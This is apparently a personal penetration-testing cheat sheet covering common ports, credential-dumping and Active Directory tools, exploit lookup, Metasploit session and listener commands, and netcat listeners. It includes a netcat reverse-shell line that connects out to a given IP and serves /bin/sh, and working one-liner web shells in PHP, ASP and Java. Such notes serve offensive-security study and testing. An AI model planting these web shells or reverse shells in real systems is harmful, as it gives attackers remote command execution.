SMB - 445
Kerberos - 88
RDP - 3389
LDAP - 389 636

Tools
Mimikatz - credential dumping
winPeas - local privesc
Bloodhound - collect AD data and find attack paths
PowerSploit - ps1 scripts


Exploit Databases
exploit-db.com
cve.mitre.org
securityfocus.com
Google Dork: "CVE-20XX-XXXX" site:github.com

Reverse Shell Generator
revshells.com

SearchSplot
       searchsploit <query>         
       searchspoit -m <exploit_id>
  
Fix Kali Issues
       github.com/Dewalt-arch/pimpmykali
  

Metasploit - exploitation framework. Has everything.
  msfconsole
  setg - set global variables
  unsetg
  search
  info
  use
  set RHOSTS <IP? - sets local variables
  unset
  sessions - lists active sessions
  session -i <session id> - connects to a session
  sessopn -u 1 - upgrade a session
  sessions -c cmd - execute comands in all sessions
  sessions -i 10-20 -c <session id> - execute commands in specific sessions
  
MetaSploit listener
  use multi/handler    : metasploit listener
  set LHOST
  run   -starts the listener
  
Python Listeners
  Python 2 simple web server
    python -m SimpleHTTPServer 8080
  Python 3 simple web server
    python -m http.server 1338
  
TCPdump
  tcpdump -t eth0 icmp  :listen for pings on specific interface
  tcpdump -i any icmp    :listen for pings on every interface
  
  
Listeners
  nc -lvnp <port>  : listens for connections on a port
        -l  start listener
        -v  run verbose
        -n  no DNS resolution
        -p  port
  nc <ip> <port> -e /bin/sh

Webshells
github.com/BlackArch/webshells
<?php echo system($_GET['cmd']);?>   : PHP one liner web shell  
<% eval request("cmd")%>  : ASP one liner web shell
<% Runtime.getRuntime().exec(request.getParameter("cmd"));%>  : java web shell
                  
                  
                  
                  
                  
                  
                  
                  
                  
